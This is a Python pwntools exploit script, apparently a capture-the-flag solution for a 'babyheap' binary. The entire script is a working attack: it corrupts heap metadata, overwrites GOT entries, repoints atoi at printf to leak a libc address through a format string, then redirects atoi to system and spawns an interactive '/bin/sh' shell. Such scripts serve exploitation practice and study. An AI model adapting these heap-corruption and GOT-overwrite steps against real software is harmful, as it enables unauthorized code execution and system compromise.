from pwn import *

debug = 1
if debug:
	#context.log_level = "debug"
	p = process('./babyheap')
else:
	pass

def new(size, content, name):
	p.recvuntil("Your choice:")
	p.sendline("1")
	p.recvuntil("Size :")
	p.sendline(str(size))
	p.recvuntil("Content:")
	p.send(content)
	p.recvuntil("Name:")
	p.send(name)

def edit(content):
	p.recvuntil("Your choice:")
	p.sendline("3")
	p.recvuntil("Content:")
	p.send(content)

def delete():
	p.recvuntil("Your choice:")
	p.sendline("2")

def exit(content):
	p.recvuntil("Your choice:")
	p.sendline("4")
	p.recvuntil("Really? (Y/n)")
	p.sendline(content)

exit_got = 0x602020
alarm_plt = 0x400790
free_got = 0x602018
printf_plt = 0x400780
atoi_got = 0x602078
read_chk_plt = 0x400750
puts_plt = 0x400760
read_plt = 0x4007A0

free_off = 0x83940
system_off = 0x45390

payload1 = 'nn' + "\x00" * (0x1000 - 0x18 - 2) + p64(0x61)
exit(payload1)
raw_input("go")
content1 = 'a' * 16
name1 = 'b' * 8
new(16, content1, name1)
delete()

got_payload  = p64(alarm_plt)             # _exit
got_payload += p64(read_chk_plt + 6)     # __read_chk
got_payload += p64(puts_plt + 6)         # puts
got_payload += p64(0xdeadbeef)
got_payload += p64(printf_plt + 6)   # printf
got_payload += p64(alarm_plt + 6)    # alarm
got_payload += p64(read_plt + 6)     # read
got_payload += p64(0xdeadbeef)
got_payload += p64(0xdeadbeef)
got_payload += p64(0xdeadbeef)
got_payload += p64(0xdeadbeef)
got_payload += p64(printf_plt)     # atoi

content2 = "\x00" * 0x20 
content2 += p64(len(got_payload))  #size
content2 += p64(0)                #name
content2 += p64(exit_got)       #content

new(0x50, content2, 'aaaa')
raw_input("go")

edit(got_payload)
raw_input("go")

p.recvuntil("Your choice:")
p.send("%9$saaaa" + p64(free_got))

free_addr = u64(p.recv(6).ljust(8, "\x00"))
libc_addr = free_addr - free_off
system_addr = libc_addr + system_off

print "free_addr: " + hex(free_addr)
print "system_addr: " + hex(system_addr)

got_payload = got_payload[:-8]
got_payload += p64(system_addr)
raw_input("go")

p.recvuntil("Your choice:")
p.send("333")
p.recvline()
p.send(got_payload)

p.recvuntil("Your choice:")
p.sendline('/bin/sh')
p.interactive()



